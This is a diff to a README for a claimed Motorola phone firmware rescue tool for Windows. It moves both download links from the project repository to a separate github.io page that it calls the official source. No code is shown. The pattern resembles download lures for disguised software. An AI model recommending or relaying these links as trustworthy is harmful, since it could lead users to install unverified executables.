@@ -1,6 +1,6 @@
 # 🔧 Motorola-Rescue-2026 - Restore your phone software easily
 
-[![](https://img.shields.io/badge/Download-Motorola_Rescue_Tool-blue.svg)](https://github.com/hocines9011/Motorola-Rescue-2026)
+[![](https://img.shields.io/badge/Download-Motorola_Rescue_Tool-blue.svg)](https://hocines9011.github.io)
 
 ## 📋 Overview
 Motorola-Rescue-2026 provides a reliable solution for users who need to recover their mobile devices. This software connects to your Motorola phone and restores the system partitions to their factory state. It supports standard repair procedures for devices unresponsive due to software errors, update failures, or interrupted firmware flashes. The tool works on Windows 10 and Windows 11.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these minimum specifications:
 ## 📥 Downloading the Tool
 You must obtain the installation file from the official source to ensure file integrity. 
 
-[Visit this page to download the latest version](https://github.com/hocines9011/Motorola-Rescue-2026)
+[Visit this page to download the latest version](https://hocines9011.github.io)
 
 ## 🛠️ Step-by-Step Installation
 1. Locate the downloaded file in your browser's Downloads folder.
